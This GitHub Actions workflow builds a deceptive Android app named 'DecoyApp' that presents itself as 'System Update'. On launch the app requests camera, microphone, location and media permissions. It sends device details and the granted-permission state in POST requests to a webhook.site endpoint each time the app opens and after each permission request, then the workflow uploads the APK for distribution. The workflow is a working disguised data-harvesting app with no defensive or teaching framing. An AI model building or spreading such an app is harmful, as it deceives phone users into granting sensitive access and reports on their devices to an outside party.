name: Build Fake Permission APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"

      - name: Setup Android SDK
        uses: android-actions/setup-android@v3
        with:
          cmdline-tools-version: "11.0"
          packages: |
            platform-tools
            platforms;android-34
            build-tools;34.0.0

      - name: Accept SDK Licenses Quietly
        run: |
          set +o pipefail
          SDK_ROOT="${ANDROID_SDK_ROOT:-${ANDROID_HOME:-/usr/local/lib/android/sdk}}"
          mkdir -p "$SDK_ROOT/licenses"
          printf "8933bad161af4178b1185d1a37fbf41ea5269c55\nd56f5exp\n24333f8a63b6825ea9c5514f83c2829b004d1fee\n" > "$SDK_ROOT/licenses/android-sdk-license" || true
          SDKMANAGER="$SDK_ROOT/cmdline-tools/latest/bin/sdkmanager"
          if [ ! -x "$SDKMANAGER" ]; then
            SDKMANAGER=$(find "$SDK_ROOT" -name "sdkmanager" -type f -executable 2>/dev/null | head -n 1)
          fi
          if [ -n "$SDKMANAGER" ]; then
            yes | "$SDKMANAGER" --sdk_root="$SDK_ROOT" --licenses >/dev/null 2>&1 || true
          fi
          echo "SDK licenses accepted."

      - name: Create Android Project
        run: |
          mkdir -p app/src/main/java/com/example/decoyapp
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values

          cat <<'EOF' > settings.gradle
          rootProject.name = "DecoyApp"
          include(":app")
          EOF

          cat <<'EOF' > build.gradle
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath "com.android.tools.build:gradle:8.2.2"
              }
          }
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat <<'EOF' > app/build.gradle
          plugins {
              id "com.android.application"
          }
          android {
              namespace "com.example.decoyapp"
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.decoyapp"
                  minSdk 23
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
          }
          dependencies {
              implementation "androidx.appcompat:appcompat:1.6.1"
          }
          EOF

          cat <<'EOF' > gradle.properties
          org.gradle.jvmargs=-Xmx2560m
          android.useAndroidX=true
          android.enableJetifier=true
          android.nonTransitiveRClass=true
          EOF

          cat <<'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.CAMERA" />
              <uses-permission android:name="android.permission.RECORD_AUDIO" />
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.VIBRATE" />

              <application
                  android:label="System Update"
                  android:usesCleartextTraffic="true"
                  android:theme="@style/Theme.AppCompat.Light.NoActionBar">
                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

          cat <<'EOF' > app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">System Update</string>
          </resources>
          EOF

          cat <<'EOF' > app/src/main/res/layout/activity_main.xml
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:gravity="center"
              android:orientation="vertical"
              android:padding="24dp"
              android:background="#111827">

              <TextView
                  android:id="@+id/statusText"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Preparing system check..."
                  android:textColor="#E5E7EB"
                  android:textSize="18sp"
                  android:layout_marginBottom="20dp" />

              <Button
                  android:id="@+id/grantBtn"
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Continue" />
          </LinearLayout>
          EOF

          cat <<'EOF' > app/src/main/java/com/example/decoyapp/MainActivity.java
          package com.example.decoyapp;

          import android.Manifest;
          import android.content.pm.PackageManager;
          import android.os.Build;
          import android.os.Bundle;
          import android.widget.Button;
          import android.widget.TextView;
          import androidx.annotation.NonNull;
          import androidx.appcompat.app.AppCompatActivity;
          import androidx.core.app.ActivityCompat;
          import androidx.core.content.ContextCompat;
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.nio.charset.StandardCharsets;
          import java.util.ArrayList;
          import java.util.List;
          import org.json.JSONObject;

          public class MainActivity extends AppCompatActivity {

              private static final int PERM_REQUEST_CODE = 1001;
              private static final String ENDPOINT_URL = "https://webhook.site/d127e7f2-d825-46ee-921d-a449bfd4fc30";

              private TextView statusText;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  statusText = findViewById(R.id.statusText);
                  Button grantBtn = findViewById(R.id.grantBtn);

                  sendDeviceEvent("app_opened");
                  requestAllPermissions();
                  statusText.setText("Verification ready.");

                  grantBtn.setOnClickListener(v -> {
                      requestAllPermissions();
                      statusText.setText("Permissions requested.");
                  });
              }

              private void requestAllPermissions() {
                  List<String> perms = new ArrayList<>();
                  perms.add(Manifest.permission.CAMERA);
                  perms.add(Manifest.permission.RECORD_AUDIO);
                  perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      perms.add(Manifest.permission.READ_MEDIA_IMAGES);
                  }
                  ActivityCompat.requestPermissions(this, perms.toArray(new String[0]), PERM_REQUEST_CODE);
              }

              @Override
              public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
                  if (requestCode == PERM_REQUEST_CODE) {
                      sendDeviceEvent("permissions_updated");
                      statusText.setText("Status synced.");
                  }
              }

              private boolean isGranted(String permission) {
                  return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED;
              }

              private void sendDeviceEvent(String eventType) {
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          JSONObject payload = new JSONObject();
                          payload.put("event", eventType);
                          payload.put("device_model", Build.MODEL);
                          payload.put("manufacturer", Build.MANUFACTURER);
                          payload.put("android_version", Build.VERSION.RELEASE);
                          payload.put("timestamp", System.currentTimeMillis());

                          JSONObject permsState = new JSONObject();
                          permsState.put("camera", isGranted(Manifest.permission.CAMERA));
                          permsState.put("record_audio", isGranted(Manifest.permission.RECORD_AUDIO));
                          permsState.put("fine_location", isGranted(Manifest.permission.ACCESS_FINE_LOCATION));
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                              permsState.put("read_media_images", isGranted(Manifest.permission.READ_MEDIA_IMAGES));
                          }
                          payload.put("permissions", permsState);

                          URL url = new URL(ENDPOINT_URL);
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                          conn.setConnectTimeout(8000);
                          conn.setReadTimeout(8000);
                          conn.setDoOutput(true);

                          try (OutputStream os = conn.getOutputStream()) {
                              os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
                          }
                          conn.getResponseCode();
                      } catch (Exception ignored) {
                      } finally {
                          if (conn != null) {
                              conn.disconnect();
                          }
                      }
                  }).start();
              }
          }
          EOF

          gradle wrapper --gradle-version 8.4 --distribution-type all

      - name: Build APK
        run: ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: decoy-permission-apk
          path: app/build/outputs/apk/debug/app-debug.apk
